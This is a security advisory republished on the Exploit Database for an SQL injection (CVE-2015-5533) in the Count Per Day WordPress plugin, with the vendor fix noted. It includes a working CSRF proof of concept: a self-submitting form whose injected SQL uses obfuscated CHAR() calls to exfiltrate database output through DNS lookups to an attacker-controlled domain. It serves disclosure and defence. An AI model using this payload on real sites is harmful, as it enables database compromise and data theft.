**Vulnerable App:**

```
Advisory ID: HTB23267
Product: Count Per Day WordPress plugin
Vendor: Tom Braider
Vulnerable Version(s): 3.4 and probably prior
Tested Version: 3.4
Advisory Publication:  July 1, 2015  [without technical details]
Vendor Notification: July 1, 2015
Vendor Patch: July 1, 2015
Public Disclosure: July 22, 2015
Vulnerability Type: SQL Injection [CWE-89]
CVE Reference: CVE-2015-5533
Risk Level: Medium
CVSSv2 Base Score: 6 (AV:N/AC:M/Au:S/C:P/I:P/A:P)
Solution Status: Fixed by Vendor
Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )

-----------------------------------------------------------------------------------------------

Advisory Details:

High-Tech Bridge Security Research Lab discovered SQL Injection vulnerability in Count Per Day WordPress plugin, which can be exploited to execute arbitrary SQL queries in application’s database, gain control of potentially sensitive information and compromise the entire website.

The vulnerability is caused by insufficient filtration of input data passed via the "cpd_keep_month" HTTP POST parameter to "/wp-admin/options-general.php" script. A remote user with administrative privileges can manipulate SQL queries, inject and execute arbitrary SQL commands within the application’s database.
This vulnerability can be exploited by anonymous attacker via CSRF vector, since the web application does not check origin of HTTP requests.

The PoC code below is based on DNS Exfiltration technique and may be used if the database of the vulnerable application is hosted on a Windows system. The PoC will send a DNS request demanding IP addess for `version()` (or any other sensetive output from the database) subdomain of ".attacker.com" (a domain name, DNS server of which is controlled by the attacker):

<form action = "http://wordpress/wp-admin/options-general.php?page=count-per-day/counter-options.php&tab=tools" method = "POST" name="f1">
<input type="hidden" name="collect" value="Collect old data">
<input type="hidden" name="do" value="cpd_collect">
<input type="hidden" name="cpd_keep_month" value="6 MONTH) AND 1=(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHAR(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(111),CHAR(111),CHAR(98),CHAR(97),CHAR(114)))) -- 2">
<input value="go type="submit" />
</form><script>document.f1.submit();</script>

-----------------------------------------------------------------------------------------------

Solution:

Update to Count Per Day 3.4.1

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
